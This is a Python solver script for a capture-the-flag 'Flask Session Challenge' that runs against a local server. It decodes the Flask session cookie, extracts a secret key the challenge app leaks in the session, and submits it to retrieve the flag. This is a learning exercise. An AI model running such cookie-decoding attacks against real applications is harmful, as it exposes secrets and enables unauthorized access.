#!/usr/bin/env python3
"""
Automatic Solver for Flask Session Challenge
Author: Keyvano
"""

import requests
import base64
import json
import sys
from urllib.parse import urlencode

# Configuration
TARGET_URL = "http://127.0.0.1:5000"
FLAG_ENDPOINT = "/flag"

def print_banner():
    """Print banner"""
    print("=" * 60)
    print("  Flask Session Challenge - Automatic Solver")
    print("  Author: Keyvano")
    print("=" * 60)
    print()

def decode_flask_cookie(cookie_value):
    """
    Decode Flask session cookie manually
    Flask cookie format: base64(payload).base64(timestamp).signature
    """
    try:
        # Split cookie by dots
        parts = cookie_value.split('.')
        if len(parts) < 2:
            return None
        
        # Get the payload (first part)
        payload = parts[0]
        
        # Add padding if needed (base64 requires length to be multiple of 4)
        padding = '=' * (4 - len(payload) % 4)
        payload += padding
        
        # Decode base64
        decoded_bytes = base64.urlsafe_b64decode(payload)
        
        # Parse JSON
        decoded_json = json.loads(decoded_bytes)
        
        return decoded_json
    except Exception as e:
        print(f"[-] Error decoding cookie: {e}")
        return None

def extract_secret_key(decoded_session):
    """
    Extract secret key from decoded session
    The key is stored in session['sk'] and is in bytes format
    Flask stores it as {' b': 'base64_string'} in the session
    """
    try:
        if 'sk' not in decoded_session:
            print("[-] 'sk' key not found in session")
            return None
        
        sk_data = decoded_session['sk']
        
        # Flask stores bytes as {' b': 'base64_string'} (note the space before 'b')
        if isinstance(sk_data, dict):
            # Try different keys that Flask might use
            for key in [' b', 'b', ' bi', 'bi']:
                if key in sk_data:
                    base64_value = sk_data[key]
                    print(f"[+] Found secret key with key: '{key}'")
                    # The value is already base64-encoded by Flask
                    return base64_value
        
        # If it's already a string, return it
        if isinstance(sk_data, str):
            return sk_data
        
        # If it's bytes, encode it to base64
        if isinstance(sk_data, bytes):
            return base64.b64encode(sk_data).decode('utf-8')
        
        print(f"[-] Unexpected sk_data format: {type(sk_data)}")
        print(f"[-] sk_data content: {sk_data}")
        return None
        
    except Exception as e:
        print(f"[-] Error extracting secret key: {e}")
        return None

def solve_challenge():
    """
    Main function to solve the challenge
    """
    print_banner()
    
    # Create a session to persist cookies
    session = requests.Session()
    
    # Step 1: Visit /flag endpoint to get session cookie
    print("[*] Step 1: Visiting /flag endpoint to get session cookie...")
    try:
        response = session.get(f"{TARGET_URL}{FLAG_ENDPOINT}")
        if response.status_code != 200:
            print(f"[-] Failed to access {TARGET_URL}{FLAG_ENDPOINT}")
            print(f"[-] Status code: {response.status_code}")
            return False
    except requests.exceptions.ConnectionError:
        print(f"[-] Cannot connect to {TARGET_URL}")
        print("[-] Make sure the Flask server is running!")
        return False
    except Exception as e:
        print(f"[-] Error: {e}")
        return False
    
    # Step 2: Extract session cookie
    print("[*] Step 2: Extracting session cookie...")
    session_cookie = response.cookies.get('session')
    
    if not session_cookie:
        print("[-] No session cookie found!")
        return False
    
    print(f"[+] Session cookie: {session_cookie[:50]}...")
    
    # Step 3: Decode session cookie
    print("[*] Step 3: Decoding session cookie...")
    decoded_session = decode_flask_cookie(session_cookie)
    
    if not decoded_session:
        print("[-] Failed to decode session cookie!")
        return False
    
    print(f"[+] Decoded session: {decoded_session}")
    
    # Step 4: Extract secret key
    print("[*] Step 4: Extracting secret key...")
    secret_key_b64 = extract_secret_key(decoded_session)
    
    if not secret_key_b64:
        print("[-] Failed to extract secret key!")
        return False
    
    print(f"[+] Secret key (base64): {secret_key_b64[:50]}...")
    
    # Step 5: Submit secret key to get flag
    print("[*] Step 5: Submitting secret key to get flag...")
    
    # URL encode the secret key (important for special characters like +, /, =)
    from urllib.parse import quote
    secret_key_encoded = quote(secret_key_b64, safe='')
    
    flag_url = f"{TARGET_URL}{FLAG_ENDPOINT}?sk={secret_key_encoded}"
    
    print(f"[+] Secret key (URL-encoded): {secret_key_encoded[:50]}...")
    print(f"[+] Request URL: {flag_url[:80]}...")
    
    try:
        flag_response = session.get(flag_url)
        
        if flag_response.status_code != 200:
            print(f"[-] Failed to get flag. Status code: {flag_response.status_code}")
            return False
        
        # Check if flag is in response
        if "UbigCTF{" in flag_response.text or "Congratulations" in flag_response.text:
            print("[+] SUCCESS! Flag found!")
            print()
            print("=" * 60)
            
            # Extract flag from HTML
            if "UbigCTF{" in flag_response.text:
                start = flag_response.text.find("UbigCTF{")
                end = flag_response.text.find("}", start) + 1
                flag = flag_response.text[start:end]
                print(f"  FLAG: {flag}")
            else:
                print("  Check the response for the flag!")
            
            print("=" * 60)
            return True
        else:
            print("[-] Wrong secret key or unexpected response")
            print(f"[-] Response preview: {flag_response.text[:200]}")
            return False
            
    except Exception as e:
        print(f"[-] Error submitting secret key: {e}")
        return False

def main():
    """Entry point"""
    try:
        success = solve_challenge()
        
        if success:
            print()
            print("[+] Challenge solved successfully!")
            sys.exit(0)
        else:
            print()
            print("[-] Failed to solve challenge")
            sys.exit(1)
            
    except KeyboardInterrupt:
        print()
        print("[!] Interrupted by user")
        sys.exit(1)
    except Exception as e:
        print(f"[-] Unexpected error: {e}")
        import traceback
        traceback.print_exc()
        sys.exit(1)

if __name__ == "__main__":
    main()
